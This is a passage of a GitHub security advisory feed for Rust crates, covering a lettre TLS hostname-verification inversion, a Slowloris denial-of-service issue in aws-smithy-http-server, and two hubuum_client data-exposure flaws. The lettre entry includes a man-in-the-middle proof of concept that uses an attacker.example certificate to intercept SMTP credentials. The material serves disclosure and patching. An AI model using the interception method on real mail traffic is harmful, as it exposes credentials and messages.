        <title type="html"><![CDATA[[lettre] lettre has TLS hostname verification disabled when using Boring TLS backend]]></title>
        <id>https://github.com/advisories/GHSA-4pj9-g833-qx53</id>
        <link href="https://github.com/advisories/GHSA-4pj9-g833-qx53"/>
        <updated>2026-07-28T14:29:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An inverted-boolean bug in lettre's <code>boring-tls</code> integration silently
disables TLS hostname verification for callers using the default (strict)
configuration. An on-path attacker presenting any chain-valid certificate
for any domain can intercept SMTP submission, including PLAIN/LOGIN
credentials and message contents, against any lettre user built with the
<code>boring-tls</code> feature. Other TLS backends (<code>native-tls</code>, <code>rustls</code>) are
unaffected.</p>
<h3 id="details">Details</h3>
<p>boring's <code>SslConnectorBuilder::set_verify_hostname(bool)</code> /
<code>verify_hostname(bool)</code> API takes a <em>verify</em> flag — <code>true</code> means enforce
hostname verification, <code>false</code> means skip it. (Boring docs:
<a href="https://docs.rs/boring/latest/boring/ssl/struct.ConnectConfiguration.html#method.set_verify_hostname">https://docs.rs/boring/latest/boring/ssl/struct.ConnectConfiguration.html#method.set_verify_hostname</a>)
lettre's <code>TlsParametersBuilder</code> exposes the opposite-named flag
<code>accept_invalid_hostnames: bool</code> — <code>true</code> means <em>accept invalid</em> (skip
verification), <code>false</code> means verify. lettre passes this flag directly to
boring at both TLS-upgrade sites, inverting the semantics:
src/transport/smtp/client/net.rs:202 (sync)
    .verify_hostname(*accept_invalid_hostnames)
src/transport/smtp/client/async_net.rs:377 (async)
    config.set_verify_hostname(accept_invalid_hostnames);
Concrete behaviour under <code>boring-tls</code>:</p>
<ul>
<li>accept_invalid_hostnames = false  (the strict default)
  → set_verify_hostname(false)  → hostname verification SKIPPED
(wrong; the caller asked for strict verification)</li>
<li>accept_invalid_hostnames = true   (explicit opt-in to "dangerous")
  → set_verify_hostname(true)   → hostname verification ENFORCED
(wrong; the caller opted into accepting any name)</li>
</ul>
<p>Boring's own warning on <code>set_verify_hostname</code>:
    "If hostname verification is not used, <em>any</em> valid certificate for
    <em>any</em> site will be trusted for use from any other. This introduces
    a significant vulnerability to man-in-the-middle attacks."
<code>native-tls</code> (src/transport/smtp/client/tls.rs:355) uses
<code>danger_accept_invalid_hostnames(self.accept_invalid_hostnames)</code>, whose
flag name and semantics match lettre's — unaffected. <code>rustls</code> uses a
separate verifier path — unaffected.
The bug was introduced in PR #797 ("Add support for boring TLS"), commit
985fa7e, first released in v0.10.1, and persists unchanged through v0.11.21
(latest). Zero existing tests cover <code>accept_invalid_hostnames</code> end-to-end
with any backend, which is why the inversion has gone undetected.
Fix: negate the flag at both call sites. Two-line patch:
    -    .verify_hostname(*accept_invalid_hostnames)
    +    .verify_hostname(!*accept_invalid_hostnames)
    -    config.set_verify_hostname(accept_invalid_hostnames);
    +    config.set_verify_hostname(!accept_invalid_hostnames);
I have the patch ready locally and can push to a private fork if a
collaborative fix branch is preferred.</p>
<h3 id="poc">PoC</h3>
<p>Setup (any lettre version &gt;= v0.10.1, built with the <code>boring-tls</code>
feature, default-strict configuration):</p>
<ol>
<li>Generate a TLS cert for any hostname the attacker controls, e.g.
<code>attacker.example</code>, signed by any CA in the client's trust store
(e.g. a Let's Encrypt cert is sufficient).</li>
<li>Stand up an attacker SMTP server on the network path between the
lettre client and the intended MX. Have it present the
<code>attacker.example</code> cert on STARTTLS or implicit TLS.</li>
<li>Use lettre with default-strict TLS to send to the real MX hostname,
e.g. <code>mail.example.com</code>:
use lettre::transport::smtp::client::{Tls, TlsParameters};
use lettre::{AsyncSmtpTransport, Tokio1Executor, Message};
let tls = TlsParameters::builder("mail.example.com".to_owned())
    .build_boring()
    .unwrap();
let mailer = AsyncSmtpTransport::::relay(
        "mail.example.com",
    )?
    .tls(Tls::Required(tls))
    .build();
mailer.send(message).await?;     // succeeds against attacker</li>
</ol>
<p>Expected with hostname verification: handshake fails because the
presented leaf cert's SAN does not match <code>mail.example.com</code>.
Actual on <code>boring-tls</code>: handshake succeeds. lettre proceeds with the
SMTP transaction, sending MAIL FROM, RCPT TO, message body, and any
configured SMTP AUTH credentials to the attacker.
Symmetric inverse PoC (proves the inversion, not just a missing check):
configure <code>.dangerous_accept_invalid_hostnames(true)</code> and try to connect
to a server whose cert SAN matches the connect domain. With the bug,
the handshake <em>fails</em> because lettre passes <code>true</code> to <code>verify_hostname</code>
and boring rejects... actually wait, it succeeds (SAN matches). Better
inverse demonstration: connect to a server whose cert SAN matches the
connect domain with <code>accept_invalid_hostnames=true</code>, then connect to a
mismatched-SAN server with the same flag — the latter is rejected,
proving the flag is inverted (the user opted into accepting any name,
yet lettre enforces strict verification).
A reproducer cargo project can be produced on request.</p>
<h3 id="impact">Impact</h3>
<p>Who is impacted: any lettre user who</p>
<ol>
<li>enables the <code>boring-tls</code> feature, AND</li>
<li>relies on default-strict hostname verification
(i.e. does NOT call <code>.dangerous_accept_invalid_hostnames(true)</code>).
This is the entire "I want strict TLS" population on <code>boring-tls</code>. They
get the opposite of what they asked for: a TLS handshake that ignores
hostname mismatch.
Exploitation: an attacker on the network path between the lettre client
and the target SMTP server, holding any chain-valid TLS certificate
(e.g. a free Let's Encrypt cert for a domain the attacker owns), can
present that certificate when the lettre client connects to the intended
MX. boring accepts the handshake, lettre proceeds, and the attacker
gains read/write access to:</li>
</ol>
<ul>
<li>SMTP envelope (MAIL FROM, RCPT TO)</li>
<li>Message bodies, attachments, headers</li>
<li>Any SMTP AUTH credentials (PLAIN, LOGIN, CRAM-MD5, etc.)</li>
<li>Any DKIM signatures and DMARC alignment downstream depends on
can be inspected and selectively dropped
Confidentiality and integrity impact: High. Availability impact: None
direct (the attacker can choose to forward or drop, but the bug itself
does not deny service).
Cloudflare's email-fwdr independently identified and mitigated this
downstream by promoting a previously-metric-only post-handshake SAN
check to a hard error (fix landed 2026-05-12). Because we're mitigated
downstream, we are not on a publication clock; we are reporting so the
upstream fix can ship and other lettre+boring-tls deployments can stop
relying on per-caller workarounds. Happy to coordinate on embargo
timing.
Affected versions: every released lettre version with <code>boring-tls</code>
support, from v0.10.1 (PR #797, commit 985fa7e) through v0.11.21
(latest). No prior advisory or fix.
Suggested fix: two-line negation of the flag at the boring call sites
(see Details). Patch is ready locally and can be attached to a private
collaboration fork.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lettre/lettre/security/advisories/GHSA-4pj9-g833-qx53">https://github.com/lettre/lettre/security/advisories/GHSA-4pj9-g833-qx53</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-46428">https://nvd.nist.gov/vuln/detail/CVE-2026-46428</a></li>
<li><a href="https://github.com/lettre/lettre/commit/f5efffc88360dbdbfcef80f465e42d5bce68ca35">https://github.com/lettre/lettre/commit/f5efffc88360dbdbfcef80f465e42d5bce68ca35</a></li>
<li><a href="https://github.com/lettre/lettre/releases/tag/v0.11.22">https://github.com/lettre/lettre/releases/tag/v0.11.22</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0141.html">https://rustsec.org/advisories/RUSTSEC-2026-0141.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4pj9-g833-qx53">https://github.com/advisories/GHSA-4pj9-g833-qx53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4pj9-g833-qx53</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-28T14:29:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aws-smithy-http-server] Smithy-RS: Allocation of resources without limits in the default aws-smithy-http-server serve() path allows unauthenticated Slowloris denial of service]]></title>
        <id>https://github.com/advisories/GHSA-jvxp-qmx7-gjpx</id>
        <link href="https://github.com/advisories/GHSA-jvxp-qmx7-gjpx"/>
        <updated>2026-07-24T22:37:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Smithy-RS is a Rust code generation and runtime framework that generates HTTP clients and servers from Smithy interface definitions, powering the AWS SDK for Rust and custom service implementations. An issue exists where, under certain circumstances, allocation of resources without limits in the default aws-smithy-http-server serve() path allows unauthenticated Slowloris denial of service. </p>
<h2 id="impact">Impact</h2>
<p>Missing connection and header-read timeouts and the absence of a concurrent-connection cap in the default serve() path of Amazon aws-smithy-http-server might allow remote attackers to cause a denial of service by opening many connections and sending partial requests that are never completed, exhausting server sockets and tasks.</p>
<p>Impacted versions: aws-smithy-http-server &lt;= 0.66.4</p>
<h2 id="patches">Patches</h2>
<p>This issue has been addressed in aws-smithy-http-server version 0.66.5. AWS recommends upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.</p>
<h2 id="workarounds">Workarounds</h2>
<p>There is no workaround besides updating to the patched version.</p>
<h2 id="contact">Contact</h2>
<p>If you have any questions or comments about this advisory, AWS asks that you contact AWS Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/smithy-lang/smithy-rs/security/advisories/GHSA-jvxp-qmx7-gjpx">https://github.com/smithy-lang/smithy-rs/security/advisories/GHSA-jvxp-qmx7-gjpx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-16756">https://nvd.nist.gov/vuln/detail/CVE-2026-16756</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-064-aws">https://aws.amazon.com/security/security-bulletins/2026-064-aws</a></li>
<li><a href="https://crates.io/crates/aws-smithy-http-server/0.66.5">https://crates.io/crates/aws-smithy-http-server/0.66.5</a></li>
<li><a href="https://github.com/advisories/GHSA-jvxp-qmx7-gjpx">https://github.com/advisories/GHSA-jvxp-qmx7-gjpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jvxp-qmx7-gjpx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T22:37:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hubuum_client] Hubuum client library (Rust): Sensitive data may be exposed through default diagnostics]]></title>
        <id>https://github.com/advisories/GHSA-2625-rw7m-5q5x</id>
        <link href="https://github.com/advisories/GHSA-2625-rw7m-5q5x"/>
        <updated>2026-07-24T21:49:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>hubuum_client</code> diagnostics can expose sensitive request, response, import/export, task, delivery, or server-provided data when applications format or log errors and public models.</p>
<h2 id="affected-behavior">Affected behavior</h2>
<p>Native <code>reqwest::Error</code> values retain the full request URL. Converting those errors into <code>ApiError::Http</code>, or exhausting retries and storing the error text in <code>ApiError::RetryExhausted</code>, preserves query parameter values. Detailed HTTP and decoding errors can retain server-provided messages, response bodies, or payload details, including through error source chains.</p>
<p>Several public response and model types also derived or implemented diagnostics over untrusted or secret-adjacent fields. These include raw response bodies and cursors; rendered and JSON export payloads; import schemas and object data; task summaries, links, output URLs, events, and import-result details; event-delivery claims and errors; event sink configuration; subscription routing; and remote-call failure details. High-level backup and export runners additionally copied unsuccessful server task summaries into <code>ApiError::Api</code>.</p>
<p>Applications commonly log errors and response values, so credentials, tokens, cursors, filters, echoed request content, imported object data, schema defaults, task or delivery details, and other sensitive payloads can be written to logs even though normal request logging redacts query values.</p>
<h2 id="remediation">Remediation</h2>
<p>The proposed fix redacts query values from embedded request URLs before storing native HTTP errors and applies the same sanitization to exhausted retries. Default error and model diagnostics now report safe metadata rather than server messages, payloads, cursors, links, configuration, or secret-adjacent details. JSON codec errors no longer appear in the standard source chain, and unsuccessful high-level backup/export operations use the structured <code>TaskUnsuccessful</code> variant without copying task summaries.</p>
<p>Explicit response, error, task, import, export, event, and delivery APIs continue to expose original values for applications that deliberately inspect them.</p>
<h2 id="validation">Validation</h2>
<p>Regression coverage exercises direct HTTP conversion, async and blocking retry exhaustion, response and decoding diagnostics, import/export/raw-response containers, unsuccessful async and blocking task runners, task/event/import-result models, and secret-bearing event and remote models. The workspace format, lint, documentation, test, feature-matrix, Rust 1.88 MSRV, OpenAPI validation, release-metadata, and combined library plus consumer integration suites pass against the immutable Hubuum 0.0.3 image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/hubuum/hubuum-client-rust/security/advisories/GHSA-2625-rw7m-5q5x">https://github.com/hubuum/hubuum-client-rust/security/advisories/GHSA-2625-rw7m-5q5x</a></li>
<li><a href="https://github.com/hubuum/hubuum-client-rust/commit/5a5c275ffa45f342459b7d3e977926da643bde50">https://github.com/hubuum/hubuum-client-rust/commit/5a5c275ffa45f342459b7d3e977926da643bde50</a></li>
<li><a href="https://github.com/hubuum/hubuum-client-rust/releases/tag/v0.6.1">https://github.com/hubuum/hubuum-client-rust/releases/tag/v0.6.1</a></li>
<li><a href="https://github.com/advisories/GHSA-2625-rw7m-5q5x">https://github.com/advisories/GHSA-2625-rw7m-5q5x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2625-rw7m-5q5x</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T21:49:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hubuum_client] Hubuum client library (Rust): Configured custom transports may be bypassed, exposing credentials and network traffic]]></title>
        <id>https://github.com/advisories/GHSA-qqc3-94qv-7fw3</id>
        <link href="https://github.com/advisories/GHSA-qqc3-94qv-7fw3"/>
        <updated>2026-07-24T21:49:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When an application configures hubuum_client with ClientBuilder::with_transport, several client operations still use the built-in reqwest client directly. The bypass includes password login, bearer-token validation, authentication-provider discovery, health and readiness probes, export-output downloads, and unified-search streams.</p>
<h2 id="impact">Impact</h2>
<p>Applications may use a custom transport as a security boundary for network isolation, proxy enforcement, request signing, audit logging, or policy checks. Affected operations bypass those controls and make direct network requests to the configured base URL. Password login can therefore send plaintext credentials outside the intended transport, while token validation can send a bearer token outside it. Other bypassing calls can evade audit and routing policy.</p>
<p>The issue affects custom transports introduced in 0.3.0. Applications that do not configure a custom transport are not affected by the bypass.</p>
<h2 id="defense-in-depth">Defense in depth</h2>
<p>The same private fix disables redirect following for built-in async and blocking clients so an authenticated request remains at the endpoint validated and constructed by the client. Applications supplying a preconfigured reqwest client continue to control its redirect policy.</p>
<h2 id="remediation">Remediation</h2>
<p>The proposed fix routes authentication, public discovery and probe calls, export downloads, unified-search streams, raw requests, and typed requests through the configured transport in both async and blocking clients. It preserves retry and error-body policies, documents the buffering semantics of custom transports, and surfaces built-in-client redirects as 3xx API errors.</p>
<h2 id="validation">Validation</h2>
<p>Regression tests assert async and blocking routing, paths, login bodies, bearer headers, streaming bodies, retries, error handling, and redirect behavior. Formatting, Clippy with warnings denied, rustdoc warnings, the complete workspace suite, all supported feature combinations, Rust 1.88 MSRV, OpenAPI validation, and the combined library plus downstream-consumer integration suites pass against the immutable Hubuum 0.0.3 image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/hubuum/hubuum-client-rust/security/advisories/GHSA-qqc3-94qv-7fw3">https://github.com/hubuum/hubuum-client-rust/security/advisories/GHSA-qqc3-94qv-7fw3</a></li>
<li><a href="https://github.com/hubuum/hubuum-client-rust/commit/5a5c275ffa45f342459b7d3e977926da643bde50">https://github.com/hubuum/hubuum-client-rust/commit/5a5c275ffa45f342459b7d3e977926da643bde50</a></li>
<li><a href="https://github.com/hubuum/hubuum-client-rust/releases/tag/v0.6.1">https://github.com/hubuum/hubuum-client-rust/releases/tag/v0.6.1</a></li>
<li><a href="https://github.com/advisories/GHSA-qqc3-94qv-7fw3">https://github.com/advisories/GHSA-qqc3-94qv-7fw3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qqc3-94qv-7fw3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T21:49:05.000Z</published>
    </entry>
</feed>